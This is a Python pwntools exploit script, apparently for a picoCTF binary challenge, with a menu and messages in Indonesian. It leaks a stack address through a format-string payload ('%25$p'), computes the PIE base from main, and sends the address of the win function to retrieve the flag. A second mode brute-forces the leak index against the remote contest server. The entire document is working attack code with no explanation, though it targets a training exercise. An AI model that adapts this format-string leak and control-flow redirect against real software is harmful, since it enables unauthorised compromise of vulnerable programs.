from pwn import *

context.log_level = "error"
elf = context.binary = ELF("./vuln")


SERV = "rescued-float.picoctf.net"
PORT = 58079

def start():
    if args.LOCAL:
        p = process("./vuln")
    else:
        p = remote(SERV,PORT)
    return p

def flag_extract():
    print('[!] extracting...')
    p = start()
    p.sendlineafter(b'name:',b"%25$p")
    elf.address = int(p.recvline().strip().decode(),16) - elf.sym.main
    p.recvuntil(b"0x12345: ")
    p.sendline(hex(elf.sym.win).encode())
    print(p.recv().decode())
    p.close()

def brute_force():
    print('[%] brute forcing...')
    i = 0
    target = str(hex(elf.sym.main))
    while True:
        i += 1
        print(f"index : {i}")
        p = start()
        p.recvuntil(b"name:")
        payload = f"%{i}$p"
        p.sendline(payload.encode())
        leak = p.recvline().strip()

        if leak[-3:].decode() == target[-3:]:
            try:
                # mengatasi apabila ada canary / addr lain dengan value akhir mirip main
                print(f"[+] Found at index {i} --> {leak.decode()}")
                elf.address = int(leak.decode(),16) - elf.sym.main
                p.recvuntil(b"0x12345: ")
                p.sendline(hex(elf.sym.win).encode())
                print(p.recv().decode())
                p.close()
                break
            except KeyboardInterrupt:
                print(f"[0] keluar..")
                
            except Exception:
                pass
                
        p.close()
        

def main():
    try:
        print('''
        0===================0
         welcome to rev tool
         1 : auto flag
         0 : brute force
        0===================0
        ''')
        c = input("[+] input : ") 
        if c == '1':
            flag_extract()
        elif c == '0':
            brute_force()
        else:
            print("gak valid, keluar")

    except KeyboardInterrupt:
        print("[0] keluar")

if __name__ == "__main__":
    main()
